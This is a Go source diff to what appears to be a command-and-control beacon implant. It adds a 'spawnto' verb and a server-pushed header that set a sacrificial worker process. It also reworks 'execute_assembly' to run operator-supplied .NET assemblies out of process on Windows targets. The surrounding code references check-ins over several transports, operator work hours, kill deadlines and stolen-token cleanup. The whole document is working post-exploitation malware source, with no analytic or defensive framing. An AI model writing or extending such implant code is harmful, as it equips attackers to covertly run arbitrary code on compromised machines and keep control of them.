@@ -131,6 +131,11 @@ func diag(format string, args ...interface{}) {
 }
 
 func Main(cfg Config) {
+	if platform.IsWorkerMode() {
+		platform.RunWorker()
+		return // unreachable; RunWorker calls os.Exit
+	}
+
 	diag("[core] === agent starting ===\n")
 	diag("[core] target os=%s arch=%s\n",
 		runtime.GOOS, runtime.GOARCH)
@@ -372,6 +377,7 @@ type Agent struct {
 	transportIndex    int
 	transport         protocol.Transport
 	transportFailures int
+	spawnTo string
 
 	session  protocol.CheckinResponse
 	identity protocol.Identity
@@ -1114,6 +1120,7 @@ func (a *Agent) fetchTasks() ([]protocol.Task, error) {
 	protocol.ScheduleSleep = -1
 	protocol.ScheduleJitter = -1
 	protocol.ScheduleKill = 0
+	protocol.ScheduleSpawnTo = ""
 
 	tasks, err := a.transport.FetchTasks(a.wire)
 	if err != nil {
@@ -1135,6 +1142,32 @@ func (a *Agent) fetchTasks() ([]protocol.Task, error) {
 		diag("[fetch] server pushed kill deadline=%d\n",
 			protocol.ScheduleKill)
 		a.deadline = time.Unix(protocol.ScheduleKill, 0)
+	}
+	// Three cases, distinguished by the wire value:
+	//
+	//   ""   — the header was absent. Leave a.spawnTo alone;
+	//          the server has nothing to say on this poll.
+	//   "-"  — the server is telling us to clear a
+	//          previously-set override. The empty session
+	//          value is rendered as "-" on the wire so the
+	//          agent can tell "clear" from "no change".
+	//   else — an operator-set path, applied verbatim. The
+	//          server refuses the reserved word "self" at the
+	//          task entry point, so a value reaching this
+	//          branch is always a real path on the target.
+	switch protocol.ScheduleSpawnTo {
+	case "":
+	case "-":
+		if a.spawnTo != "" {
+			diag("[fetch] server cleared spawnto\n")
+			a.spawnTo = ""
+		}
+	default:
+		if a.spawnTo != protocol.ScheduleSpawnTo {
+			diag("[fetch] server pushed spawnto=%q\n",
+				protocol.ScheduleSpawnTo)
+			a.spawnTo = protocol.ScheduleSpawnTo
+		}
 	}
 	return tasks, nil
 }
@@ -1342,6 +1375,8 @@ func (a *Agent) execute(t protocol.Task) protocol.Result {
 		return a.sleepVerb(t)
 	case "workhours":
 		return a.workhoursVerb(t)
+	case "spawnto":
+		return a.spawntoVerb(t)
 	case "kill", "exit":
 		diag("[exec] self-destruct requested\n")
 		closeStolenTokenOnExit()
@@ -1364,21 +1399,39 @@ func (a *Agent) execute(t protocol.Task) protocol.Result {
 
 func (a *Agent) executeAssemblyVerb(
 	ctx context.Context, t protocol.Task) protocol.Result {
+
+	if runtime.GOOS != "windows" {
+		return protocol.Result{ID: t.ID,
+			Error: "execute_assembly requires a Windows target"}
+	}
 	if len(t.Args) < 1 {
 		return protocol.Result{ID: t.ID,
-			Error: "execute_assembly requires base64 shellcode"}
+			Error: "execute_assembly requires base64-encoded " +
+				"assembly as first arg"}
 	}
-	waitSecs := 60
-	if len(t.Args) > 1 {
-		if n, err := strconv.Atoi(t.Args[1]); err == nil {
-			waitSecs = n
-		}
-	}
-	out, code, err := platform.ExecShellcodeWindows(
-		ctx, t.Args[0], waitSecs)
+
+	asmBytes, err := base64.StdEncoding.DecodeString(t.Args[0])
 	if err != nil {
+		return protocol.Result{ID: t.ID,
+			Error: "invalid base64 assembly: " + err.Error()}
+	}
+
+	var argsString string
+	if len(t.Args) > 1 {
+		argsString = t.Args[1]
+	}
+
+	diag("[execasm] assembly=%d bytes args=%q spawnto=%q\n",
+		len(asmBytes), argsString, a.spawnTo)
+
+	out, code, err := platform.ExecAssemblyOutOfProcess(
+		ctx, asmBytes, argsString, a.spawnTo)
+	if err != nil {
+		diag("[execasm] worker failed: %v\n", err)
 		return protocol.Result{ID: t.ID, Error: err.Error()}
 	}
+	diag("[execasm] worker returned code=%d output=%d bytes\n",
+		code, len(out))
 	return protocol.Result{ID: t.ID,
 		Output:   encodeOutput([]byte(out)),
 		ExitCode: code}
@@ -1949,6 +2002,62 @@ func formatWorkHours() string {
 	return fmt.Sprintf("%02d:%02d-%02d:%02d",
 		protocol.WorkHoursStart/60, protocol.WorkHoursStart%60,
 		protocol.WorkHoursEnd/60, protocol.WorkHoursEnd%60)
+}
+
+// spawntoVerb is the task-form setter for the sacrificial
+// worker path used by execute_assembly. It is the DNS transport's
+// equivalent of the X-Beacon-SpawnTo response header the HTTP,
+// QUIC, and WebSocket transports carry; the two paths write the
+// same Agent.spawnTo field, and ExecAssemblyOutOfProcess reads it
+// in both cases.
+//
+// Two values are meaningful:
+//
+//   * "-" or ""   — clear the override. The worker falls back to
+//                   the default path under %LOCALAPPDATA%.
+//   * anything else — a literal path on the target. Validated
+//                   for length and control bytes only; whether
+//                   the file exists is checked at spawn time,
+//                   not at set time, because the operator may be
+//                   setting a path that will be created between
+//                   now and the next execute_assembly.
+//
+// The reserved word "self" is refused: it named a self-spawn
+// mode that ran the worker from the beacon's own on-disk file,
+// and that mode is gone because a worker sharing the parent's
+// file is a footgun the default path exists to avoid.
+func (a *Agent) spawntoVerb(t protocol.Task) protocol.Result {
+	if len(t.Args) < 1 {
+		cur := a.spawnTo
+		if cur == "" {
+			cur = "<default>"
+		}
+		return protocol.Result{ID: t.ID,
+			Output: encodeOutput([]byte("spawnto=" + cur + "\n"))}
+	}
+
+	v := strings.TrimSpace(t.Args[0])
+
+	if v == "" || v == "-" {
+		a.spawnTo = ""
+		diag("[spawnto] cleared — reverting to default worker path\n")
+		return protocol.Result{ID: t.ID,
+			Output: encodeOutput([]byte("spawnto=<default>\n"))}
+	}
+
+	if len(v) > 512 {
+		return protocol.Result{ID: t.ID,
+			Error: "spawnto path is too long (max 512 characters)"}
+	}
+	if strings.ContainsAny(v, "\r\n\x00") {
+		return protocol.Result{ID: t.ID,
+			Error: "spawnto path contains control bytes"}
+	}
+
+	a.spawnTo = v
+	diag("[spawnto] set to %q\n", v)
+	return protocol.Result{ID: t.ID,
+		Output: encodeOutput([]byte("spawnto=" + v + "\n"))}
 }
 
 func (a *Agent) simpleVerb(t protocol.Task, payload []byte) protocol.Result {
